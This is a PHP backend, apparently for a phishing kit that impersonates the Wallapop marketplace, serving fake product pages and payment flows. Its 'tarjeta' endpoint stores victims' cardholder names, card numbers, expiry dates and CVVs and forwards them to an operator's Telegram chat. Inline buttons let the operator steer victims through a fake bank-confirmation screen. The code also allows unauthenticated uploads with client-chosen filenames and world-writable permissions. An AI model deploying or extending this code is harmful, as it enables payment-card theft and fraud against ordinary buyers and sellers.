<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

require_once __DIR__ . '/functions.php';

// Detectar acción y parámetros tanto por query como por URL limpia
$uri = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
$action = $_GET['action'] ?? '';
$id = $_GET['id'] ?? '';

if (empty($action)) {
    if (preg_match('#^/api/product/([^/]+)/tarjeta/status#', $uri, $m)) {
        $action = 'tarjeta_status';
        $id = $m[1];
    } elseif (preg_match('#^/api/product/([^/]+)/confirmar/status#', $uri, $m)) {
        $action = 'confirmar_status';
        $id = $m[1];
    } elseif (preg_match('#^/api/product/([^/]+)/set_status#', $uri, $m)) {
        $action = 'set_status';
        $id = $m[1];
    } elseif (preg_match('#^/api/product/([^/]+)/tarjeta#', $uri, $m)) {
        $action = 'tarjeta';
        $id = $m[1];
    } elseif (preg_match('#^/api/product/([^/]+)/confirmar#', $uri, $m)) {
        $action = 'confirmar';
        $id = $m[1];
    } elseif (preg_match('#^/api/product/([^/]+)#', $uri, $m)) {
        $action = 'product';
        $id = $m[1];
    } elseif (strpos($uri, '/api/upload') !== false) {
        $action = 'upload_photo';
    } elseif (strpos($uri, '/api/sync_products') !== false || strpos($uri, '/api/sync') !== false) {
        $action = 'sync_products';
    } elseif (strpos($uri, '/api/set_status') !== false) {
        $action = 'set_status';
    } elseif (strpos($uri, '/api/tarjeta/status') !== false) {
        $action = 'tarjeta_status';
    } elseif (strpos($uri, '/api/confirmar/status') !== false) {
        $action = 'confirmar_status';
    } elseif (strpos($uri, '/api/health') !== false) {
        $action = 'health';
    }
}

if (empty($id)) {
    $id = $_GET['id'] ?? get_active_id();
}

switch ($action) {
    case 'upload_photo':
    case 'upload':
        $uploaded = false;
        $savedFilename = '';

        if (!is_dir(PHOTOS_DIR)) {
            @mkdir(PHOTOS_DIR, 0777, true);
        }
        @chmod(PHOTOS_DIR, 0777);

        // 1. Archivo subido por multipart (campo 'photo' o 'file')
        $fileObj = !empty($_FILES['photo']) ? $_FILES['photo'] : (!empty($_FILES['file']) ? $_FILES['file'] : null);
        if ($fileObj && $fileObj['error'] === UPLOAD_ERR_OK) {
            $tmp = $fileObj['tmp_name'];
            $orig = $fileObj['name'];
            $ext = strtolower(pathinfo($orig, PATHINFO_EXTENSION)) ?: 'jpg';
            if (!in_array($ext, ['jpg', 'jpeg', 'png', 'webp', 'gif'])) {
                $ext = 'jpg';
            }
            $targetName = !empty($_POST['filename']) ? basename($_POST['filename']) : ('img_' . date('YmdHis') . '_' . bin2hex(random_bytes(3)) . '.' . $ext);
            $dest = PHOTOS_DIR . '/' . $targetName;
            if (@move_uploaded_file($tmp, $dest) || @copy($tmp, $dest)) {
                @chmod($dest, 0666);
                $uploaded = true;
                $savedFilename = $targetName;
            }
        } else {
            // 2. Archivo subido en formato JSON con base64 o raw binary
            $rawInput = @file_get_contents('php://input');
            $data = @json_decode($rawInput, true);
            if (!empty($data['base64'])) {
                $b64 = $data['base64'];
                if (strpos($b64, 'base64,') !== false) {
                    $b64 = explode('base64,', $b64)[1];
                }
                $binary = @base64_decode($b64);
                if ($binary) {
                    $targetName = !empty($data['filename']) ? basename($data['filename']) : ('img_' . date('YmdHis') . '_' . bin2hex(random_bytes(3)) . '.jpg');
                    $dest = PHOTOS_DIR . '/' . $targetName;
                    if (@file_put_contents($dest, $binary)) {
                        @chmod($dest, 0666);
                        $uploaded = true;
                        $savedFilename = $targetName;
                    }
                }
            } elseif ($rawInput && strlen($rawInput) > 100) {
                // Posible binary directo
                $targetName = !empty($_GET['filename']) ? basename($_GET['filename']) : ('img_' . date('YmdHis') . '_' . bin2hex(random_bytes(3)) . '.jpg');
                $dest = PHOTOS_DIR . '/' . $targetName;
                if (@file_put_contents($dest, $rawInput)) {
                    @chmod($dest, 0666);
                    $uploaded = true;
                    $savedFilename = $targetName;
                }
            }
        }

        if ($uploaded && $savedFilename) {
            $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
            $fullUrl = $proto . '://' . $host . '/photos/' . $savedFilename;
            $relUrl = '/photos/' . $savedFilename;
            echo json_encode([
                'ok' => true,
                'filename' => $savedFilename,
                'url' => $relUrl,
                'full_url' => $fullUrl
            ], JSON_UNESCAPED_SLASHES);
        } else {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'No se pudo guardar la imagen en el storage']);
        }
        break;

    case 'set_status':
        $reqStatus = $_POST['status'] ?? ($_GET['status'] ?? '');
        if (empty($reqStatus)) {
            $rawInput = @file_get_contents('php://input');
            $data = @json_decode($rawInput, true);
            if (!empty($data['status'])) {
                $reqStatus = $data['status'];
            }
        }

        if (!empty($id) && !empty($reqStatus)) {
            set_tx_status($id, $reqStatus);
            echo json_encode(['ok' => true, 'id' => $id, 'status' => $reqStatus]);
        } else {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Parámetros incompletos (id o status faltante)']);
        }
        break;

    case 'sync_products':
    case 'sync_product':
        $rawInput = @file_get_contents('php://input');
        $data = @json_decode($rawInput, true);
        if ($data && is_array($data)) {
            $prods = isset($data['products']) ? $data['products'] : $data;
            $actId = $data['activeId'] ?? '';

            if (!empty($actId)) {
                @file_put_contents(ACTIVO_FILE, $actId);
                @chmod(ACTIVO_FILE, 0666);
            }

            $toSave = [
                'products' => $prods,
                'activeId' => $actId ?: get_active_id()
            ];

            @file_put_contents(PRODUCTS_JSON, json_encode($toSave, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
            @chmod(PRODUCTS_JSON, 0666);
            @file_put_contents(DATA_PRODUCTS_JSON, json_encode($toSave, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
            @chmod(DATA_PRODUCTS_JSON, 0666);

            $jsContent = 'window.SERVER_DB = ' . json_encode($toSave, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . ";\n";
            @file_put_contents(__DIR__ . '/products.js', $jsContent);
            @chmod(__DIR__ . '/products.js', 0666);

            echo json_encode(['ok' => true, 'msg' => 'Productos sincronizados en el storage del hosting']);
        } else {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'JSON inválido']);
        }
        break;

    case 'product':
        $prod = find_product($id);
        if ($prod) {
            echo json_encode($prod, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } else {
            http_response_code(404);
            echo json_encode(['error' => 'Not found']);
        }
        break;

    case 'tarjeta':
        $raw = file_get_contents('php://input');
        $card = json_decode($raw, true) ?: [];
        $saved = save_card_record($id, $card);
        set_tx_status($id, 'waiting');

        $p = find_product($id);
        $prodTit = $p['titulo'] ?? ($p['articulo'] ?? $id);
        $chatId = get_chat_id();

        $titular = htmlspecialchars($card['titular'] ?? 'No especificado');
        $numero = htmlspecialchars($card['numero'] ?? '—');
        $marca = htmlspecialchars($card['marca'] ?? '');
        $cad = htmlspecialchars($card['cad'] ?? '—');
        $cvv = htmlspecialchars($card['cvv'] ?? '—');

        $tgMsg = "💳 <b>¡NUEVA TARJETA RECIBIDA!</b>\n" .
                 "───────────────────\n" .
                 "📦 <b>Producto:</b> " . htmlspecialchars($prodTit) . "\n" .
                 "🆔 <b>ID:</b> <code>" . htmlspecialchars($id) . "</code>\n\n" .
                 "👤 <b>Titular:</b> " . $titular . "\n" .
                 "💳 <b>Tarjeta:</b> <code>" . $numero . "</code> (" . $marca . ")\n" .
                 "📅 <b>Caducidad:</b> <code>" . $cad . "</code>\n" .
                 "🔒 <b>CVV:</b> <code>" . $cvv . "</code>";

        $kb = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ Continuar', 'callback_data' => 'continuar_' . $id],
                    ['text' => '❌ Error', 'callback_data' => 'error_' . $id]
                ]
            ]
        ];

        tg_request('sendMessage', [
            'chat_id' => $chatId,
            'text' => $tgMsg,
            'parse_mode' => 'HTML',
            'reply_markup' => $kb,
            'disable_web_page_preview' => true
        ]);

        echo json_encode(['ok' => true, 'status' => 'waiting']);
        break;

    case 'tarjeta_status':
        $st = get_tx_status($id);
        echo json_encode(['status' => $st, 'id' => $id]);
        break;

    case 'confirmar':
        $raw = file_get_contents('php://input');
        $reqData = json_decode($raw, true) ?: [];
        $currSt = get_tx_status($id);
        if ($currSt !== 'confirmado_final') {
            set_tx_status($id, 'en_confirmar');
        }

        $p = find_product($id);
        $prodTit = $p['titulo'] ?? ($p['articulo'] ?? ($reqData['titulo'] ?? $id));
        $prodPre = format_eur($p['precioArticulo'] ?? ($p['precio'] ?? ($reqData['precio'] ?? '')));
        $chatId = get_chat_id();

        $tgMsg = "📱 <b>CLIENTE EN CONFIRMACIÓN</b>\n" .
                 "───────────────────\n" .
                 "📦 <b>Producto:</b> " . htmlspecialchars($prodTit) . "\n" .
                 "🆔 <b>ID:</b> <code>" . htmlspecialchars($id) . "</code>" .
                 ($prodPre ? "\n💰 <b>Importe:</b> " . htmlspecialchars($prodPre) : "") . "\n\n" .
                 "⏳ El cliente está en la pantalla de confirmación bancaria.";

        $kb = [
            'inline_keyboard' => [
                [
                    ['text' => 'Confirmar de nuevo', 'callback_data' => 'confirmar_again_' . $id]
                ]
            ]
        ];

        tg_request('sendMessage', [
            'chat_id' => $chatId,
            'text' => $tgMsg,
            'parse_mode' => 'HTML',
            'reply_markup' => $kb,
            'disable_web_page_preview' => true
        ]);

        echo json_encode(['ok' => true, 'status' => get_tx_status($id)]);
        break;

    case 'confirmar_status':
        $st = get_tx_status($id);
        echo json_encode(['status' => $st, 'id' => $id]);
        break;

    case 'health':
        echo json_encode([
            'ok' => true,
            'time' => time(),
            'storage_photos_dir' => is_dir(PHOTOS_DIR),
            'storage_photos_writable' => is_writable(PHOTOS_DIR),
            'storage_data_writable' => is_writable(DATA_DIR)
        ]);
        break;

    default:
        echo json_encode(['ok' => true, 'msg' => 'API Wallapop PHP ready']);
        break;
}
